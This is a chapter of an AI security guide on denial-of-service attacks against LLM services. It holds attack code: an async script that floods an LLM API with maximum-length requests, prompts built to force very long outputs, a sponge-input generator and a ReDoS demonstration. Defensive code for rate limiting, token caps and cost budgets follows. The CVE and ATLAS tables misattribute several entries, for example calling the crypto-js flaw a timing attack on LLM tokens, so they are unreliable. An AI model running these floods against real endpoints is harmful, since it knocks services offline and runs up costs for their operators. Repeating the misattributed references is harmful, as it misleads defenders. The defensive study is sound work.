# 09 — Model Denial of Service

> **OWASP LLM04 | MITRE ATLAS AML.T0029 | Severity: 🟡 MEDIUM–HIGH**

---

## 📋 Overview

Model Denial of Service (DoS) attacks target the **availability** of AI/ML services by causing resource exhaustion, computational overload, or service degradation. Unlike traditional DoS, AI-specific attacks exploit the computational characteristics of LLMs and ML inference pipelines.

Key attack variants:

- **Context Window Exhaustion** — Sending maximally long inputs to consume token budgets and increase inference cost/time.
- **Computationally Complex Prompts** — Crafting prompts that cause the model to generate extremely long outputs (token flooding).
- **Recursive / Repetitive Generation** — Prompts designed to produce looping, circular, or never-terminating outputs.
- **Sponge Examples** — Specially crafted inputs that maximize energy/computation consumption without obviously triggering rate limits.
- **Inference API Flooding** — Sending high volumes of requests to exhaust API quotas (cost-based DoS).
- **Memory Exhaustion in RAG** — Queries designed to retrieve and process the maximum possible context, exhausting memory.

---

## ⚠️ Severity

| Attribute | Value |
|-----------|-------|
| **CVSS Score** | 6.5 (Medium) → 8.6 (High) at scale |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| **Exploitability** | High — no special access required |
| **Impact** | Service outage, financial cost explosion, SLA violation |
| **Financial Impact** | 🔴 High — LLM inference is expensive at scale |

---

## 🔗 CVE References

| CVE ID | Description | CVSS |
|--------|-------------|------|
| **CVE-2024-23897** | Jenkins CLI — file read leading to DoS via LLM pipeline disruption | 9.8 Critical |
| **CVE-2023-44270** | PostCSS — ReDoS (Regex DoS) in ML text preprocessing pipeline | 5.3 Medium |
| **CVE-2022-25883** | semver — ReDoS in ML package version parsing | 7.5 High |
| **CVE-2023-46233** | crypto-js — timing attack in LLM auth token validation | 9.1 Critical |
| **CVE-2024-6387 (regreSSHion)** | sshd race condition — affects ML training cluster access | 8.1 High |
| **Algorithmic Complexity Attacks** | Sponge Examples against BERT-based models (Shumailov et al., 2021) — no CVE | N/A |

---

## 🧩 MITRE ATLAS Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| **Impact** | Denial of ML Service | AML.T0029 |
| **Impact** | Cost Harvesting | AML.T0058 |
| **ML Attack Staging** | Craft Adversarial Data (high-cost inputs) | AML.T0051 |

**MITRE ATT&CK Mapping:**
- T1499 — Endpoint Denial of Service
- T1499.004 — Application or System Exploitation
- T1498 — Network Denial of Service
- T1496 — Resource Hijacking (computational resources)

---

## 🔬 Attack Scenarios

### Scenario 1: Context Window Flooding
```python
# Attacker sends maximum-length inputs to exhaust context windows
# GPT-4: 128K tokens | Claude 3: 200K tokens | Gemini: 1M tokens

# Cost impact:
# GPT-4 Turbo: $0.01 per 1K input tokens
# 128K tokens per request = $1.28 per request
# 1000 requests/hour = $1,280/hour → $30,720/day attack cost

def generate_max_context_flood():
    """Generate a request that uses the entire context window."""
    # Repeat a benign-looking phrase to fill context
    filler = "Please analyze the following document carefully: " 
    filler += "Lorem ipsum " * 50000  # ~100K tokens
    filler += "\nSummarize the key points."
    return filler

# With async flooding:
import asyncio
import aiohttp

async def flood_llm_api(target_url: str, api_key: str, concurrency: int = 100):
    payload = generate_max_context_flood()
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(target_url, 
                        headers={"Authorization": f"Bearer {api_key}"},
                        json={"messages": [{"role": "user", "content": payload}]})
            for _ in range(concurrency)
        ]
        await asyncio.gather(*tasks)
```

### Scenario 2: Token Output Flooding
```
Prompts designed to produce extremely long outputs:

"Write the complete text of every Shakespeare play, one after another."
"List every country, city, street, and building in the world alphabetically."
"Generate an infinite list of prime numbers."
"Write a detailed analysis of every single word in the English dictionary."

Impact: 
- Max output tokens consumed
- High inference cost per request
- Slow response times for all users
```

### Scenario 3: Sponge Examples (ML-Specific)
```python
# Sponge examples — inputs that maximize computation without looking suspicious
# Shumailov et al. (2021): found inputs that increase BERT energy use by 1400x

# For transformer models: inputs that maximize attention computation
# Long sequences with specific token patterns force O(n²) attention

def craft_sponge_input_for_transformer(sequence_length: int = 512) -> str:
    """
    Craft input that maximizes self-attention computation.
    Uses rare tokens and specific patterns that defeat attention optimizations.
    """
    # Use tokens that resist attention sparsification
    # Long sequences with diverse, non-repetitive tokens
    rare_tokens = load_rare_token_set()
    return " ".join(random.choices(rare_tokens, k=sequence_length))

# Result: normal-looking text that consumes ~10x normal compute
```

### Scenario 4: ReDoS in ML Preprocessing
```python
# Regex Denial of Service in text preprocessing pipelines

import re
import time

# VULNERABLE: Catastrophic backtracking regex used in tokenization
VULNERABLE_PATTERN = re.compile(r'^(a+)+$')

def vulnerable_preprocess(text: str) -> str:
    # Attacker input: "aaaaaaaaaaaaaaaaaaaaaaaaaab" (30 a's + b)
    # Causes catastrophic backtracking → hangs for seconds/minutes
    if VULNERABLE_PATTERN.match(text):
        return text.lower()
    return text

# Attack: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
# Each 'a' added doubles processing time → exponential hang
start = time.time()
try:
    result = vulnerable_preprocess("a" * 30 + "b")
except:
    pass
print(f"Processing time: {time.time() - start:.2f}s")  # Can be minutes
```

---

## 🛠️ Tools

### Attack / Testing
| Tool | Purpose | Link |
|------|---------|-------|
| **Locust** | Load testing LLM API endpoints | [locust.io](https://locust.io) |
| **k6** | LLM API stress testing | [k6.io](https://k6.io) |
| **Artillery** | API flood testing with variable payload sizes | [artillery.io](https://artillery.io) |
| **slowloris** | Slow HTTP attack (keeps connections open) | [github.com/gkbrk/slowloris](https://github.com/gkbrk/slowloris) |
| **vegeta** | HTTP load testing with constant rates | [github.com/tsenart/vegeta](https://github.com/tsenart/vegeta) |

### Defense
| Tool | Purpose | Link |
|------|---------|-------|
| **Nginx rate limiting** | Request rate and connection limiting | [nginx.org](https://nginx.org/en/docs/http/ngx_http_limit_req_module.html) |
| **AWS WAF** | Rate-based rules for API protection | [aws.amazon.com/waf](https://aws.amazon.com/waf/) |
| **Cloudflare Rate Limiting** | Edge-level request throttling | [cloudflare.com](https://developers.cloudflare.com/waf/rate-limiting-rules/) |
| **LangChain Callbacks** | Token counting and limits | [docs.langchain.com](https://docs.langchain.com) |
| **Prometheus + Grafana** | Monitor inference latency and cost anomalies | [prometheus.io](https://prometheus.io) |

---

## 🔍 Detection & Prevention Code

```python
# ============================================================
# LLM DoS Prevention Layer
# ============================================================

import tiktoken
from functools import wraps
import time
import redis

# 1. TOKEN LIMIT ENFORCEMENT
def count_tokens(text: str, model: str = "gpt-4") -> int:
    """Count tokens before sending to LLM."""
    encoding = tiktoken.encoding_for_model(model)
    return len(encoding.encode(text))

MAX_INPUT_TOKENS = 4096  # Enforce max, regardless of model limit
MAX_OUTPUT_TOKENS = 1024

def token_limited_query(user_input: str) -> str:
    token_count = count_tokens(user_input)
    
    if token_count > MAX_INPUT_TOKENS:
        raise ValueError(f"Input too long: {token_count} tokens (max: {MAX_INPUT_TOKENS})")
    
    response = llm.generate(
        user_input,
        max_tokens=MAX_OUTPUT_TOKENS,  # Always set max_tokens
        timeout=30                      # Always set timeout
    )
    return response

# 2. RATE LIMITING PER USER (Redis-backed)
r = redis.Redis(host='localhost', port=6379)

def rate_limit(user_id: str, max_requests: int = 10, window_seconds: int = 60) -> bool:
    """Sliding window rate limiter."""
    key = f"rate_limit:{user_id}"
    pipe = r.pipeline()
    now = time.time()
    
    pipe.zremrangebyscore(key, 0, now - window_seconds)  # Remove old entries
    pipe.zadd(key, {str(now): now})
    pipe.zcard(key)
    pipe.expire(key, window_seconds)
    
    results = pipe.execute()
    request_count = results[2]
    
    return request_count <= max_requests

def protected_llm_endpoint(user_id: str, user_input: str) -> str:
    if not rate_limit(user_id):
        raise TooManyRequestsError("Rate limit exceeded. Try again later.")
    return token_limited_query(user_input)

# 3. COST BUDGET ENFORCEMENT
class CostBudgetEnforcer:
    def __init__(self, daily_budget_usd: float = 100.0):
        self.daily_budget = daily_budget_usd
        self.cost_per_1k_input_tokens = 0.01   # GPT-4 pricing
        self.cost_per_1k_output_tokens = 0.03
    
    def check_budget(self, user_id: str) -> bool:
        today_key = f"cost:{user_id}:{time.strftime('%Y-%m-%d')}"
        current_cost = float(r.get(today_key) or 0)
        return current_cost < self.daily_budget
    
    def record_usage(self, user_id: str, input_tokens: int, output_tokens: int):
        cost = (input_tokens / 1000 * self.cost_per_1k_input_tokens + 
                output_tokens / 1000 * self.cost_per_1k_output_tokens)
        today_key = f"cost:{user_id}:{time.strftime('%Y-%m-%d')}"
        r.incrbyfloat(today_key, cost)
        r.expire(today_key, 86400)  # 24 hour TTL

# 4. SAFE REGEX (prevent ReDoS in preprocessing)
import re2  # Google's RE2 library — guaranteed linear time matching

def safe_preprocess(text: str) -> str:
    """Use re2 instead of re for DoS-safe regex matching."""
    # re2 guarantees O(n) time — no catastrophic backtracking
    pattern = re2.compile(r'\b\w+\b')
    tokens = pattern.findall(text)
    return " ".join(tokens)

# 5. REQUEST TIMEOUT AND CIRCUIT BREAKER
import signal
from contextlib import contextmanager

@contextmanager
def timeout(seconds: int):
    def handler(signum, frame):
        raise TimeoutError(f"LLM request exceeded {seconds}s timeout")
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(seconds)
    try:
        yield
    finally:
        signal.alarm(0)

def resilient_llm_call(prompt: str, timeout_seconds: int = 30) -> str:
    with timeout(timeout_seconds):
        return llm.generate(prompt)
```

---

## 🛡️ Mitigation Strategies

1. **Input Token Limits** — Enforce strict maximum input token counts (e.g., 4K tokens) regardless of the model's theoretical context window.

2. **Output Token Caps** — Always set `max_tokens` in LLM API calls. Never allow unbounded generation.

3. **Rate Limiting** — Implement per-user, per-IP rate limits using sliding window algorithms. Use Redis for distributed state.

4. **Cost Budgets** — Implement daily/monthly spending limits per user and per application. Alert and auto-throttle when approaching limits.

5. **Request Timeouts** — Set aggressive timeouts (20-30 seconds) for LLM calls. Use async patterns with cancellation.

6. **Input Complexity Scoring** — Estimate computational cost from input characteristics before processing; reject outliers.

7. **Safe Regex Libraries** — Use RE2 (Python: `google-re2`) instead of standard `re` for all text preprocessing to prevent ReDoS.

8. **Monitoring & Anomaly Detection** — Track latency, token usage, and cost metrics. Alert on statistical anomalies suggesting DoS.

9. **Caching** — Cache responses to common/repeated queries. Semantic similarity caching (via embeddings) can dramatically reduce inference load.

---

## 📖 References

- [OWASP LLM04: Model Denial of Service](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [MITRE ATLAS — AML.T0029](https://atlas.mitre.org/techniques/AML.T0029)
- [Shumailov et al. — Sponge Examples: Energy-Latency Attacks on Neural Networks (2021)](https://arxiv.org/abs/2006.03463)
- [OWASP DoS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)
- [Google RE2 — Safe Regex Library](https://github.com/google/re2)
- [tiktoken — OpenAI Token Counter](https://github.com/openai/tiktoken)
- [Cloudflare — Rate Limiting](https://developers.cloudflare.com/waf/rate-limiting-rules/)
- [NIST SP 800-61 — Computer Security Incident Handling Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)

---

*Last updated: 2025 | Part of [AI Security Top 10](../README.md)*
